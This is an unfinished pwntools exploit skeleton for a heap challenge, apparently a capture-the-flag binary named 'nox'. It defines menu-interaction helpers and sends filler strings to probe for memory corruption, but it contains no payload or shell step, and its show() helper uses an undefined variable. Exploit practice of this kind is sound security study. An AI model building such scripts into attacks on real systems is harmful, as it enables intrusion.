#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./nox')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()



def c(idx):
    sla("Your choice: ",idx)

def malloc(name,count):
    c(1)
    sa("Enter your username: ",name)
    sla("Enter the amount of money to add to your account: ",count)

def count(count,name,money):
    c(2)
    sla("Enter the amount of premiums you would like to buy: ",count)
    sa("If you'd like to stop creating more accounts, press Y: ","\n")
    sa("Enter the username of user #0: ",name)
    sla("Enter the amount of money to add to the #0 user: ",money)
    sla("If you'd like to stop creating more accounts, press Y: ","Y")

def computer(idx,com,name,count):
    c(3)
    sla("Enter your user id: ",idx)
    sla("Enter computer name: ",com)
    sa("Enter manufacturer name: ",name)
    sla("Is this a SUPER fast computer?(Y/N): ","Y")
    sla("Enter the amount of money you are willing to pay: ",count)
    sla("Would you like to buy this computer? (Y/N): ","Y")

def show():
    c(4)
    sla("Enter user id: ",idx)

def edit(idx,name,money):
    c(5)
    sla("Enter user id: ",idx)
    sa("Enter new username: ",name)
    sla("Enter the new amount of money to add to your account: ",money)

def back(idx,name):
    c(6)
    sla("Enter user id: ",idx)
    sa("Enter computer name: ",name)

malloc("A"*0x1f,32)
count(100,"1"*0x1f,50)
computer(0,"B"*0x1f,"2"*0x1f,10)
#back(0,"B"*0x1f)
#edit(0,"C"*0x1f,100)
#back(1,"1"*0x1f)
input()

io.interactive()
